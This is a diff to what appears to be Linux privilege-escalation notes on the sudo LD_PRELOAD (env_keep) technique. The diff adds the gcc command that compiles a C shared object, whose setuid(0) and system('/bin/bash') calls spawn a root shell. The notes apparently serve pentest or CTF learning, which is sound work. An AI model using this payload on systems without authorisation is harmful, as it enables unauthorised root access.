@@ -234,7 +234,8 @@ Note: the LD_PRELOAD option will be ignored if the real user ID is different fro
 Summary:  
 1. Check for LD_PRELOAD (with the env_keep option)  
 2. Write a simple C code compiled as a share object (.so extension) file  
-3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file  
+3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
 ```
 #include <stdio.h>
 #include <sys/types.h>
@@ -247,5 +248,8 @@ setuid(0);
 system("/bin/bash");
 }
 ```
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;  
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 
